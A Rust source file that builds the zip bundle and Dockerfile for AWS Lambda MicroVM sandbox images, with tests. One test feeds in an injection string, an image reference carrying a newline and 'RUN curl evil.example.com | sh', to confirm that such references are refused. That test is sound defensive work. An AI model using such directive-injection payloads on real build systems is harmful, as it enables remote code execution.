//! The bundle a Lambda MicroVM image is built from.
//!
//! AWS builds a MicroVM image from a zip containing a Dockerfile, not from a container image
//! reference, so a declared `code.image` has to be turned into one. That is Alien's packaging
//! problem, not something a user should have to express.
//!
//! The layout is the whole security story of the image: where the agent sits, who owns it, and
//! who the untrusted code runs as.

use std::fs::File;
use std::io::Write;
use std::path::Path;

use crate::error::{ErrorData, Result};
use crate::sandbox_identity::BaseIdentity;
use alien_error::AlienError;
use alien_error::{Context, IntoAlienError};

use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use alien_core::sandbox_image::{
    contract_env, entrypoint, identity_setup, AGENT_MODE, AGENT_PATH, AWS_MICROVM,
};
use alien_core::{sandbox_image::SandboxImageCommand, SandboxEgress};
use oci_client::config::Config;

/// Name the agent binary must have inside the bundle.
pub const AGENT_FILENAME: &str = "alien-sandbox-agent";

/// Where the agent comes from at image-build time: `Image` copies it out of a published
/// container image (no binary in the bundle, a new agent is a tag change); `Binary` embeds a
/// local build instead, for CI on the current commit and for pre-publish development.
#[derive(Debug, Clone)]
pub enum AgentSource {
    /// A published image holding the agent at [`AGENT_PATH`].
    Image(String),
    /// A local agent binary, zipped into the bundle beside the Dockerfile.
    Binary(std::path::PathBuf),
}

/// Refuses a reference that cannot cross into generated content: a newline in it writes its own
/// Dockerfile directives.
fn checked_reference<'a>(reference: &'a str, what: &str) -> Result<&'a str> {
    if reference.is_empty()
        || reference
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err(AlienError::new(ErrorData::BuildConfigInvalid {
            message: format!(
                "{what} reference '{reference}' is empty or carries whitespace or control \
                 characters, which cannot cross into a generated Dockerfile"
            ),
        }));
    }
    Ok(reference)
}

/// Renders the Dockerfile for a sandbox image built on `base_image`.
///
/// Everything below the base image comes from [`AWS_MICROVM`]; what is rendered here is the
/// `COPY` that installs the agent, which has no counterpart in the GCP image because the agent
/// can arrive from a published image or from the bundle itself.
pub fn dockerfile(
    base_image: &str,
    agent: &AgentSource,
    identity: &BaseIdentity,
) -> Result<String> {
    render_dockerfile(base_image, agent, &identity.contract(AWS_MICROVM, None)?)
}

fn render_dockerfile(
    base_image: &str,
    agent: &AgentSource,
    contract: &alien_core::sandbox_image::SandboxImage,
) -> Result<String> {
    let base_image = checked_reference(base_image, "base image")?;
    // Both lines pin ownership and mode themselves: the untrusted code the agent supervises must
    // not be able to rewrite the supervisor, whichever way the agent arrived.
    let copy_agent = match agent {
        AgentSource::Image(image) => {
            let image = checked_reference(image, "agent image")?;
            format!(
                "COPY --from={image} --chown=0:0 --chmod={AGENT_MODE:04o} {AGENT_PATH} {AGENT_PATH}"
            )
        }
        AgentSource::Binary(_) => {
            format!("COPY --chown=0:0 --chmod={AGENT_MODE:04o} {AGENT_FILENAME} {AGENT_PATH}")
        }
    };

    Ok(format!(
        r#"FROM {base_image}

# The base image may end as a non-root user. The lines below write /etc/passwd and the agent must
# start as root to drop to the exec identity before every command, so root is set explicitly.
USER 0:0

# Protect the parent directories too: a writable parent allows replacing a root-owned file.
RUN for path in / /usr /usr/local /usr/local/bin /opt /opt/alien /etc; do \
      test ! -L "$path" && mkdir -p "$path" && chown 0:0 "$path" && chmod 0755 "$path" || exit 1; \
    done

{copy_agent}

# Written with numeric ids and a plain append rather than useradd/adduser, which differ across
# base distributions. Linux runs a process under a uid with no passwd entry, but some tooling
# inside the sandbox reads one.
{identity}

# The full contract, in the image rather than only in the template. The ready hook runs during
# the image build, and the agent refuses to start without every one of these — so a value
# supplied only at run time leaves the build waiting on an agent that never came up.
{contract}

{entry}
"#,
        identity = identity_setup(contract),
        contract = contract_env(contract),
        entry = entrypoint(contract),
    ))
}

/// Writes the bundle AWS builds a MicroVM image from: the rendered Dockerfile, plus the agent
/// binary beside it when the agent is a local build rather than a published image.
///
/// The archive is flat on purpose — `CreateMicrovmImage` looks for the Dockerfile at the root,
/// and a nested directory produces a build failure minutes in rather than a rejected request.
pub fn write_bundle(
    destination: &Path,
    base_image: &str,
    agent: &AgentSource,
    identity: &BaseIdentity,
) -> Result<()> {
    write_bundle_inner(
        destination,
        base_image,
        agent,
        None,
        None,
        &identity.contract(AWS_MICROVM, None)?,
    )
}

/// Packages the declared sandbox, preserving the released layout for legacy egress modes.
///
/// Internet sandboxes need the inspected base image command because the root agent starts that
/// command only after installing the egress boundary. Both source-built and published images
/// use their final OCI configuration here; callers must not infer it from a Dockerfile.
pub fn write_declared_bundle(
    destination: &Path,
    base_image: &str,
    agent: &AgentSource,
    egress: &SandboxEgress,
    image_config: Option<&Config>,
    identity: &BaseIdentity,
) -> Result<()> {
    if !matches!(egress, SandboxEgress::Internet) {
        return write_bundle(destination, base_image, agent, identity);
    }
    let config = image_config.ok_or_else(|| {
        AlienError::new(ErrorData::BuildConfigInvalid {
            message:
                "An internet sandbox bundle requires the base image's inspected OCI configuration"
                    .to_string(),
        })
    })?;
    write_supervised_bundle(
        destination,
        base_image,
        agent,
        &image_command_from_config(config)?,
        identity,
        None,
    )
}

/// Extracts the original execution configuration without exposing it in a public artifact.
pub fn image_command_from_config(config: &Config) -> Result<SandboxImageCommand> {
    let invalid = |message: &str| {
        AlienError::new(ErrorData::BuildConfigInvalid {
            message: message.to_string(),
        })
    };
    let mut env = std::collections::BTreeMap::new();
    for entry in config.env.iter().flatten() {
        let (key, value) = entry.split_once('=').ok_or_else(|| {
            invalid("The base image OCI environment contains an entry without '='")
        })?;
        if key.is_empty() || key.contains('\0') || value.contains('\0') {
            return Err(invalid(
                "The base image OCI environment contains an invalid entry",
            ));
        }
        env.insert(key.to_string(), value.to_string());
    }
    let command = SandboxImageCommand {
        command: config
            .entrypoint
            .iter()
            .flatten()
            .chain(config.cmd.iter().flatten())
            .cloned()
            .collect(),
        env,
        working_directory: config
            .working_dir
            .as_deref()
            .filter(|directory| !directory.is_empty())
            .unwrap_or("/")
            .to_string(),
    };
    Ok(command)
}

/// Writes a bundle preserving the base image's OCI command for unprivileged startup.
/// `image_command` must come from inspecting the declared base image, not an exec request.
pub fn write_supervised_bundle(
    destination: &Path,
    base_image: &str,
    agent: &AgentSource,
    image_command: &alien_core::sandbox_image::SandboxImageCommand,
    identity: &BaseIdentity,
    command_uid: Option<u32>,
) -> Result<()> {
    write_bundle_inner(
        destination,
        base_image,
        agent,
        Some(image_command),
        None,
        &identity.contract(AWS_MICROVM, command_uid)?,
    )
}

/// Copies command metadata from a private image instead of publishing its contents in the ZIP.
/// The image must hold the inspected command at `IMAGE_COMMAND_PATH` and be pullable by the
/// image build role. A digest reference keeps the command tied to the packaged base image.
pub fn write_supervised_bundle_with_command_image(
    destination: &Path,
    base_image: &str,
    agent: &AgentSource,
    command_image: &str,
    identity: &BaseIdentity,
) -> Result<()> {
    let reference = checked_reference(command_image, "Image command")?;
    let digest = reference.rsplit_once("@sha256:").map(|(_, digest)| digest);
    if !digest.is_some_and(|digest| {
        digest.len() == 64 && digest.bytes().all(|byte| byte.is_ascii_hexdigit())
    }) {
        return Err(AlienError::new(ErrorData::BuildConfigInvalid {
            message: "An image command source must be pinned by sha256 digest".to_string(),
        }));
    }
    write_bundle_inner(
        destination,
        base_image,
        agent,
        None,
        Some(reference),
        &identity.contract(AWS_MICROVM, None)?,
    )
}

fn write_bundle_inner(
    destination: &Path,
    base_image: &str,
    agent: &AgentSource,
    image_command: Option<&alien_core::sandbox_image::SandboxImageCommand>,
    command_image: Option<&str>,
    contract: &alien_core::sandbox_image::SandboxImage,
) -> Result<()> {
    let failed = |operation: &str, path: &Path| ErrorData::FileOperationFailed {
        operation: operation.to_string(),
        file_path: path.display().to_string(),
        reason: "could not assemble the sandbox image bundle".to_string(),
    };

    // Every fallible input resolves before the archive exists, so no failure — a bad reference
    // or an unreadable agent binary — leaves a truncated zip behind.
    let mut dockerfile = render_dockerfile(base_image, agent, contract)?;
    let command_bytes = image_command
        .map(serde_json::to_vec)
        .transpose()
        .into_alien_error()
        .context(failed("serialize image command", destination))?;
    if image_command.is_some() {
        dockerfile.push_str(&format!(
            "\nCOPY --chown=0:0 --chmod=0444 image-command.json {}\n",
            alien_core::sandbox_image::IMAGE_COMMAND_PATH
        ));
    }
    if let Some(image) = command_image {
        dockerfile.push_str(&format!(
            "\nCOPY --from={image} --chown=0:0 --chmod=0444 {path} {path}\n",
            path = alien_core::sandbox_image::IMAGE_COMMAND_PATH,
        ));
    }
    let agent_bytes = match agent {
        AgentSource::Binary(agent_binary) => Some(
            std::fs::read(agent_binary)
                .into_alien_error()
                .context(failed("read", agent_binary))?,
        ),
        AgentSource::Image(_) => None,
    };

    let archive = File::create(destination)
        .into_alien_error()
        .context(failed("create", destination))?;
    let mut zip = ZipWriter::new(archive);

    if let Some(bytes) = agent_bytes {
        // `AGENT_MODE` makes the entry executable; the Dockerfile's `--chmod` covers
        // builders that drop archive modes, and neither alone is reliable across both.
        let options: SimpleFileOptions = SimpleFileOptions::default().unix_permissions(AGENT_MODE);
        zip.start_file(AGENT_FILENAME, options)
            .into_alien_error()
            .context(failed("write", destination))?;
        zip.write_all(&bytes)
            .into_alien_error()
            .context(failed("write", destination))?;
    }

    if let Some(bytes) = command_bytes {
        zip.start_file(
            "image-command.json",
            SimpleFileOptions::default().unix_permissions(0o444),
        )
        .into_alien_error()
        .context(failed("write image command", destination))?;
        zip.write_all(&bytes)
            .into_alien_error()
            .context(failed("write image command", destination))?;
    }
    zip.start_file(
        "Dockerfile",
        SimpleFileOptions::default().unix_permissions(0o644),
    )
    .into_alien_error()
    .context(failed("write", destination))?;
    zip.write_all(dockerfile.as_bytes())
        .into_alien_error()
        .context(failed("write", destination))?;

    zip.finish()
        .into_alien_error()
        .context(failed("finalize", destination))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    fn dockerfile(base: &str, agent: &super::AgentSource) -> super::Result<String> {
        super::dockerfile(base, agent, &root_identity())
    }

    fn root_identity() -> super::BaseIdentity {
        super::BaseIdentity {
            user: String::new(),
            passwd: None,
            group: None,
        }
    }
    fn write_bundle(
        destination: &std::path::Path,
        base: &str,
        agent: &super::AgentSource,
    ) -> super::Result<()> {
        super::write_bundle(destination, base, agent, &root_identity())
    }
    #[test]
    fn internet_packaging_refuses_missing_or_malformed_image_configuration() {
        let directory = tempfile::tempdir().unwrap();
        let destination = directory.path().join("bundle.zip");
        let agent = super::AgentSource::Image("example.com/agent:v1".into());
        for config in [
            None,
            Some(oci_client::config::Config {
                env: Some(vec!["invalid-entry".into()]),
                ..Default::default()
            }),
        ] {
            let error = super::write_declared_bundle(
                &destination,
                "example.com/base:v1",
                &agent,
                &alien_core::SandboxEgress::Internet,
                config.as_ref(),
                &root_identity(),
            )
            .expect_err("cannot publish an Internet bundle without a usable image configuration");
            assert_eq!(error.code, "PACKAGE_CONFIG_INVALID");
            assert!(
                !destination.exists(),
                "failure must not leave a publishable archive"
            );
        }
    }

    #[test]
    fn declared_legacy_modes_keep_the_released_bundle_bytes() {
        let directory = tempfile::tempdir().unwrap();
        let original = directory.path().join("original.zip");
        let declared = directory.path().join("declared.zip");
        let agent = super::AgentSource::Image("example.com/agent:v1".into());
        write_bundle(&original, "example.com/base:v1", &agent).unwrap();
        for egress in [
            alien_core::SandboxEgress::None,
            alien_core::SandboxEgress::Allow,
            alien_core::SandboxEgress::AllowDomains {
                domains: vec!["example.com".into()],
            },
        ] {
            super::write_declared_bundle(
                &declared,
                "example.com/base:v1",
                &agent,
                &egress,
                None,
                &root_identity(),
            )
            .unwrap();
            assert_eq!(
                std::fs::read(&original).unwrap(),
                std::fs::read(&declared).unwrap()
            );
        }
    }

    /// The reference reaches a generated Dockerfile, so a newline in it writes directives of the
    /// caller's choosing. Both entry points render through `dockerfile`, so the refusal is here.
    #[test]
    fn an_image_reference_that_would_inject_directives_is_refused() {
        for reference in [
            "alpine\nRUN curl evil.example.com | sh",
            "alpine:3 \nFROM scratch",
            "",
            "alpine\tlatest",
        ] {
            dockerfile(
                reference,
                &super::AgentSource::Image("agent:v1".to_string()),
            )
            .expect_err(&format!("{reference:?} must not render into a Dockerfile"));
            dockerfile(
                "ubuntu:24.04",
                &super::AgentSource::Image(reference.to_string()),
            )
            .expect_err(&format!(
                "{reference:?} must not render as an agent image either"
            ));
        }

        // The control arm: an ordinary reference still renders, so the guard is not refusing
        // everything.
        let rendered = dockerfile(
            "public.ecr.aws/lambda/microvms:al2023-minimal",
            &super::AgentSource::Image("agent:v1".to_string()),
        )
        .expect("an ordinary reference renders");
        assert!(rendered.starts_with("FROM public.ecr.aws/lambda/microvms:al2023-minimal"));
    }

    use super::*;

    /// The archive has to be flat and contain both entries: `CreateMicrovmImage` looks for the
    /// Dockerfile at the root, and a nested layout fails minutes into a build instead of being
    /// rejected up front.
    #[test]
    fn the_bundle_is_flat_and_carries_both_entries() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"\x7fELF-not-really").expect("agent");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(&bundle, "ubuntu:24.04", &AgentSource::Binary(agent))
            .expect("writes the bundle");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("reads as a zip");

        let mut names: Vec<String> = (0..archive.len())
            .map(|i| archive.by_index(i).expect("entry").name().to_string())
            .collect();
        names.sort();
        assert_eq!(names, vec!["Dockerfile", AGENT_FILENAME]);

        for name in &names {
            assert!(
                !name.contains('/'),
                "the archive must be flat, found '{name}'"
            );
        }

        let mut dockerfile_entry = archive.by_name("Dockerfile").expect("Dockerfile entry");
        let mut contents = String::new();
        std::io::Read::read_to_string(&mut dockerfile_entry, &mut contents).expect("reads");
        assert!(contents.starts_with("FROM ubuntu:24.04"));
    }

    /// Image-sourced bundles carry no agent binary: the zip holds only the Dockerfile.
    #[test]
    fn an_image_sourced_bundle_carries_only_the_dockerfile() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(
            &bundle,
            "ubuntu:24.04",
            &AgentSource::Image("public.ecr.aws/acme/sandbox-agent:v1".to_string()),
        )
        .expect("writes the bundle");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("zip");
        assert_eq!(archive.len(), 1, "nothing but the Dockerfile belongs here");

        let mut dockerfile = String::new();
        std::io::Read::read_to_string(
            &mut archive.by_name("Dockerfile").expect("dockerfile entry"),
            &mut dockerfile,
        )
        .expect("reads");
        assert!(
            dockerfile.contains(&format!(
                "COPY --from=public.ecr.aws/acme/sandbox-agent:v1 \
                 --chown=0:0 --chmod=0755 {AGENT_PATH} {AGENT_PATH}"
            )) || dockerfile.contains(&format!(
                "COPY --from=public.ecr.aws/acme/sandbox-agent:v1 --chown=0:0 --chmod=0755 {AGENT_PATH} {AGENT_PATH}"
            )),
            "the agent must be copied out of the named image, root-owned and 0755:\n{dockerfile}"
        );
        assert!(
            !dockerfile.contains(&format!("COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} ")),
            "the local-file COPY must not appear when the agent comes from an image"
        );
    }

    /// A failed input must leave nothing at the destination — a truncated zip uploaded by a
    /// caller that only checked the exit path fails ~160s into an image build instead of here.
    #[test]
    fn a_missing_agent_binary_leaves_no_bundle_behind() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(
            &bundle,
            "ubuntu:24.04",
            &AgentSource::Binary(dir.path().join("does-not-exist")),
        )
        .expect_err("an unreadable agent must fail the bundle");

        assert!(
            !bundle.exists(),
            "no partial archive may be left at the destination"
        );
    }

    /// The agent entry must survive as an executable. A builder that honours archive modes and
    /// one that does not both have to produce a runnable binary, which is why the Dockerfile
    /// also carries `--chmod`.
    #[test]
    fn the_agent_entry_is_executable() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"binary").expect("agent");
        let bundle = dir.path().join("sandbox.zip");
        write_bundle(&bundle, "ubuntu:24.04", &AgentSource::Binary(agent)).expect("writes");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("zip");
        let entry = archive.by_name(AGENT_FILENAME).expect("agent entry");
        assert_eq!(
            entry.unix_mode().map(|mode| mode & 0o777),
            Some(0o755),
            "the agent entry must be executable in the archive"
        );
    }
}
